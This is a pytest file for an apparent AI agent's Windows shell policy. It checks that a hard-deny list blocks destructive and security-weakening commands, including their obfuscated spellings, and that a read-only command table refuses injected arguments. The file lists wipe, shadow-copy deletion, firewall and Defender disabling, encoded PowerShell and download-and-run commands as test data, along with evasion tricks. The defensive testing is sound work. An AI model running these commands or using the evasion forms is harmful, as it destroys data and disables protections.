"""Shell rules: the read-only table and the hard-deny list.

The hard-deny table has one case per listed item, then the obfuscation forms that
cmd.exe and PowerShell accept, then the ordinary commands that must still pass.
"""
from __future__ import annotations

import os

import pytest

from coworker.policy.shell_rules import READONLY, classify_free_text, hard_deny, normalise_command

# ------------------------------------------------------------- hard deny: one per listed item

LISTED_ITEMS = [
    ("format C: /q", "format"),
    ("diskpart", "diskpart"),
    ("bcdedit /set {default} recoveryenabled no", "bcdedit"),
    ("reg delete HKCU\\Software\\Example /f", "reg_delete"),
    ("reg add HKLM\\Software\\Example /v x", "reg_add"),
    ("shutdown /s /t 0", "shutdown"),
    ("del /s /q C:\\Users\\me\\Old", "delete_recursive"),
    ("rd /s /q C:\\Users\\me\\Old", "delete_recursive"),
    ("rmdir /S C:\\Users\\me\\Old", "delete_recursive"),
    ("erase C:\\Users\\me\\notes.txt", "erase"),
    ("cipher /w:C:\\", "cipher_wipe"),
    ("sdelete -p 3 secret.txt", "sdelete"),
    ("Remove-Item C:\\Users\\me\\Old -Recurse", "remove_item_forced"),
    ("Remove-Item C:\\Users\\me\\Old -Force", "remove_item_forced"),
    ("Clear-RecycleBin -Force", "clear_recyclebin"),
    ("vssadmin delete shadows /all /quiet", "vssadmin_delete"),
    ("netsh advfirewall set allprofiles state off", "netsh_change"),
    ("Set-MpPreference -DisableRealtimeMonitoring $true", "defender_change"),
    ("powershell -EncodedCommand SQBFAFgA", "encoded_command"),
    ("Invoke-Expression $payload", "invoke_expression"),
    ("iex $payload", "invoke_expression"),
    ("(New-Object Net.WebClient).DownloadString('http://example.com/a.ps1')", "download_string"),
    ("(New-Object Net.WebClient).DownloadFile('http://example.com/a.exe', 'a.exe')", "download_file"),
    ("Start-Process cmd -Verb RunAs", "start_process_runas"),
    ("runas /user:admin cmd", "runas"),
    ("takeown /f C:\\Windows\\System32\\x.dll", "takeown"),
    ("icacls C:\\Users\\me /grant Everyone:F", "icacls_grant"),
    ("schtasks /create /tn x /tr calc /sc once /st 00:00", "schtasks_create"),
    ("sc create svc binPath= C:\\x.exe", "sc_create_delete"),
    ("sc delete svc", "sc_create_delete"),
    ("wmic process call create calc", "wmic_process_create"),
]


@pytest.mark.parametrize("text, rule", LISTED_ITEMS)
def test_each_listed_item_is_denied(text, rule):
    assert hard_deny(text) == rule


def test_hard_deny_returns_a_rule_id_and_classify_maps_it_to_the_error_code():
    assert hard_deny("format C:") == "format"
    assert classify_free_text("format C:") == "hard_deny"


def test_classify_free_text_is_none_for_an_ordinary_command():
    assert classify_free_text("dir C:\\Users") is None


# ----------------------------------------------------- hard deny: related forms


@pytest.mark.parametrize("text, rule", [
    ("Format-Volume -DriveLetter D", "disk_wipe"),
    ("Clear-Disk -Number 1 -RemoveData", "disk_wipe"),
    ("Stop-Computer -Force", "shutdown"),
    ("Restart-Computer", "shutdown"),
    ("wmic shadowcopy delete", "shadow_copy_delete"),
    ("rm -r C:\\Users\\me\\Old", "remove_item_forced"),
    ("ri C:\\x -fo", "remove_item_forced"),
    ("Set-MpPreference -ExclusionPath C:\\x", "defender_change"),
    ("Add-MpPreference -ExclusionPath C:\\x", "defender_change"),
    ("netsh firewall set opmode disable", "netsh_change"),
    ("start-process x -verb:runas", "start_process_runas"),
    ("sc.exe delete svc", "sc_create_delete"),
    ("sdelete64 -s C:\\x", "sdelete"),
    ("cipher.exe /W:C:\\", "cipher_wipe"),
    ("pwsh -enc SQBFAFgA", "encoded_command"),
    ("powershell -e SQBFAFgA", "encoded_command"),
])
def test_related_destructive_forms_are_denied(text, rule):
    assert hard_deny(text) == rule


# ------------------------------------------------------------ obfuscation forms


@pytest.mark.parametrize("text, rule", [
    ("FoRmAt D:", "format"),                          # letter case
    ("FORMAT.COM C:", "format"),                      # extension
    ("reg    delete   HKCU\\x", "reg_delete"),         # runs of spaces
    ("reg\tdelete HKCU\\x", "reg_delete"),            # tab
    ("re^g de^lete HKCU\\x", "reg_delete"),           # cmd caret escapes
    ('"reg" "delete" HKCU\\x', "reg_delete"),         # double quotes
    ("'reg' 'delete' HKCU\\x", "reg_delete"),         # single quotes
    ("d^el /s x", "delete_recursive"),
    ("del /S x", "delete_recursive"),                 # upper-case switch
    ("del/s x", "delete_recursive"),                  # switch without a space
    ("del,/s x", "delete_recursive"),                 # cmd treats commas as separators
    ("del;/s x", "delete_recursive"),
    ('cmd /c "del /s x"', "delete_recursive"),        # wrapped in cmd
    ("Remove-It`em -Recur`se x", "remove_item_forced"),  # PowerShell backtick escapes
    ("& 'Remove-Item' -Recurse x", "remove_item_forced"),
    ("Remove-Item x -r", "remove_item_forced"),       # unambiguous abbreviation
    ("Remove-Item x -fo", "remove_item_forced"),
    ("Remove-Item x -Recurse:$true", "remove_item_forced"),
    ("ｆｏｒｍａｔ c:", "format"),                      # full-width letters, folded by NFKC
    ("powershell -EncodedCommand:SQBFAFgA", "encoded_command"),
    ("powershell.exe -ENC SQBFAFgA", "encoded_command"),
    ("Start-Process x -Verb:RunAs", "start_process_runas"),
    ("Invoke-Expression ('x' + 'y')", "invoke_expression"),
    ("'iex' $code", "invoke_expression"),
])
def test_obfuscated_spellings_are_still_denied(text, rule):
    assert hard_deny(text) == rule


def test_normalisation_removes_caret_quote_and_backtick_noise():
    assert normalise_command('re^g  "DELETE"  `x') == "reg delete x"


# ------------------------------------------------------------- ordinary commands


@pytest.mark.parametrize("text", [
    "Get-ChildItem | Format-Table",       # Format-Table is not format
    "reformat the drive later",           # a word that contains "format"
    "echo hello",
    "git status",
    "dir C:\\Users",
    "reg query HKCU\\Software",           # reading the registry is allowed
    "cipher /e C:\\x",                    # encrypting, not wiping
    "findstr /s needle *.txt",            # /s is not a delete switch
    "netsh advfirewall show allprofiles",
    "netstat -ano -p TCP",
    "Get-Date",
    "powershell -ExecutionPolicy Bypass -Command Get-Date",  # -ExecutionPolicy is not -EncodedCommand
    "ping -e 127.0.0.1",                  # -e is only special for PowerShell
    "where python",
])
def test_ordinary_commands_are_not_denied(text):
    assert hard_deny(text) is None


# ------------------------------------------ permanent deletes of one item (no Recycle Bin)


@pytest.mark.parametrize("text", [
    "del file.txt",
    "erase notes.txt",
    "rd emptyfolder",
    "rmdir old",
    "del -Recurse -Force C:\\Users\\x\\Documents\\old",   # PowerShell alias with PowerShell switches
    "del -Force C:\\Users\\x\\Documents\\a.txt",
    "rd -Recurse C:\\Users\\x\\old",
    "Remove-Item C:\\Users\\me\\old.txt",                 # a plain Remove-Item is permanent too
    "ri C:\\Users\\me\\old.txt",
    "rm C:\\Users\\me\\old.txt",
    "Get-ChildItem C:\\x -Recurse | Remove-Item",
    "Clear-Content C:\\Users\\me\\log.txt",
    "robocopy C:\\a C:\\b /MIR",
    "robocopy C:\\a C:\\b /E /PURGE",
    "[System.IO.File]::Delete('C:\\Users\\me\\a.txt')",
    "[IO.File]::Delete('C:\\Users\\me\\a.txt')",
    "[System.IO.Directory]::Delete(C:\\x, $true)",
    "[Microsoft.VisualBasic.FileIO.FileSystem]::DeleteFile('C:\\a.txt', 'OnlyErrorDialogs', 'DeletePermanently')",
])
def test_permanent_deletes_of_one_item_are_denied(text):
    assert hard_deny(text) is not None


@pytest.mark.parametrize("text, rule", [
    ("del -Recurse -Force C:\\Users\\x\\Documents\\old", "permanent_delete"),
    ("Clear-Content C:\\x.txt", "permanent_delete"),
    ("robocopy C:\\a C:\\b /MIR", "robocopy_purge"),
    ("[IO.File]::Delete('C:\\a.txt')", "dotnet_delete"),
    ("[System.IO.Directory]::Delete(C:\\x, $true)", "dotnet_delete"),
])
def test_permanent_delete_rules_have_their_own_ids(text, rule):
    assert hard_deny(text) == rule


# ------------------------------------------------- dash variants PowerShell reads as a switch


@pytest.mark.parametrize("dash", [
    "\u2010", "\u2011", "\u2012", "\u2013", "\u2014", "\u2015", "\u2212", "\ufe58", "\ufe63", "\uff0d",
])
def test_every_dash_variant_is_read_as_a_switch_prefix(dash):
    assert hard_deny(f"powershell {dash}EncodedCommand SQBFAFgA") == "encoded_command"
    assert hard_deny(f"Remove-Item C:\\x {dash}Recurse {dash}Force") == "remove_item_forced"


def test_en_dash_switches_on_a_plain_remove_item_are_denied():
    assert hard_deny("Remove-Item \u2013Recurse \u2013Force C:\\Users\\x") == "remove_item_forced"


def test_normalise_command_maps_dashes_to_an_ascii_hyphen():
    assert normalise_command("a\u2013b\u2014c\u2212d") == "a-b-c-d"


# ------------------------------------------------------------------ read-only table


def test_readonly_table_has_exactly_the_starter_set():
    assert set(READONLY) == {"sysinfo", "ipconfig", "whoami", "tasklist", "date", "where", "dir", "netstat"}


@pytest.mark.parametrize("command_id, argv", [
    ("sysinfo", ["systeminfo"]),
    ("ipconfig", ["ipconfig", "/all"]),
    ("whoami", ["whoami"]),
    ("tasklist", ["tasklist"]),
    ("date", ["powershell", "-NoProfile", "-Command", "Get-Date"]),
    ("netstat", ["netstat", "-ano", "-p", "TCP"]),
])
def test_fixed_commands_build_their_argv_without_an_argument(command_id, argv):
    assert READONLY[command_id].build() == argv


@pytest.mark.parametrize("command_id", ["sysinfo", "ipconfig", "whoami", "tasklist", "date", "netstat"])
def test_fixed_commands_refuse_an_extra_argument(command_id):
    assert READONLY[command_id].build("anything") is None


@pytest.mark.parametrize("name", ["python.exe", "notepad", "node-18", "a_b.c"])
def test_where_accepts_one_plain_name(name):
    assert READONLY["where"].build(name) == ["where.exe", name]


@pytest.mark.parametrize("name", [
    "a b", "python.exe & del x", "-r", "*.exe", "tool?", "..\\x", "", "C:\\x", "x" * 65,
])
def test_where_refuses_anything_that_is_not_one_plain_name(name):
    assert READONLY["where"].build(name) is None


def test_where_without_its_argument_is_refused():
    assert READONLY["where"].build() is None


@pytest.mark.skipif(os.name != "nt", reason="directory validation uses Windows path rules")
def test_dir_builds_cmd_argv_for_a_plain_drive_path(tmp_path):
    target = str(tmp_path / "Documents")
    assert READONLY["dir"].build(target) == ["cmd", "/c", "dir", target]


@pytest.mark.skipif(os.name != "nt", reason="directory validation uses Windows path rules")
@pytest.mark.parametrize("value", [
    "C:\\a&del x",
    "C:\\a|calc",
    "C:\\a>out.txt",
    "C:\\a\"b",
    "C:\\a%PATH%",
    "C:\\a!b",
    "C:\\a^b",
    "C:\\a,b",
    "C:\\a /s",
    "C:/a",
    "relative\\path",
    "\\\\server\\share",
    "C:\\a\\..\\Windows",
])
def test_dir_refuses_cmd_syntax_and_non_drive_paths(value):
    assert READONLY["dir"].build(value) is None


@pytest.mark.skipif(os.name != "nt", reason="directory validation uses Windows path rules")
def test_dir_refuses_a_protected_folder(tmp_path, monkeypatch):
    monkeypatch.setenv("COWORKER_HOME", str(tmp_path / "coworker"))
    assert READONLY["dir"].build(str(tmp_path / "coworker")) is None
